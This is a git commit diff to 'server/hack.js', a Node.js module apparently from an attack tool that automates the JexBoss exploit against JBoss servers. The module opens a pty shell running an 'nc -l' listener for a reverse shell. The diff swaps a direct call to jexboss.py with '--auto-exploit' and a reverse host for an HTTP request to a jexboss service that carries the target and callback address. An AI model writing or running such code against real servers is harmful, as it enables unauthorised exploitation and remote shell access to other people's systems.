b1e9a9ed45582890c3eae1fdfede20c8a46534a4
gastrodia <nil@sanwu.org>
2018-01-04 01:08:47 +0800

    jexboss

--- server/hack.js
+++ server/hack.js
@@ -1,6 +1,6 @@
 
 const { spawn } = require('child_process');
-
+const { get } = require('http')
 var os = require('os');
 var pty = require('node-pty');
  
@@ -9,7 +9,6 @@ var shell = os.platform() === 'win32' ? 'powershell.exe' : 'bash';
 
 
 module.exports = function(host,reverseHost,callback) {
-    console.log( ['-vv', '-l', reverseHost.split(':')[1]])
  
     var ptyProcess = pty.spawn(shell, [], {
         name: 'xterm-color',
@@ -22,26 +21,10 @@ module.exports = function(host,reverseHost,callback) {
 
       ptyProcess.write(`nc -vv -l ${reverseHost.split(':')[1]}\r`);
 
+      get(`http://jexboss:3000/?host=${host}&reverse=${reverseHost}`)
 
-
-
-    const jexboss = spawn('python', ['./exploit/jexboss/jexboss.py', '--auto-exploit', '-host', host,
-        '--reverse-host', reverseHost]);
-
-    jexboss.stdout.on('data', (data) => {
-        console.log(`jexboss stdout: ${data}`);
-        if (data.indexOf('Type [ENTER] to continue...') > -1) {
-            nc.stdin.write('\n');
-        }
-    });
-
-    jexboss.stderr.on('data', (data) => {
-        console.log(`jexboss stderr: ${data}`);
-    });
-
-    jexboss.on('close', (code) => {
-        console.log(`jexboss child process exited with code ${code}`);
-    });
+      
 
     callback(ptyProcess);
 }
+
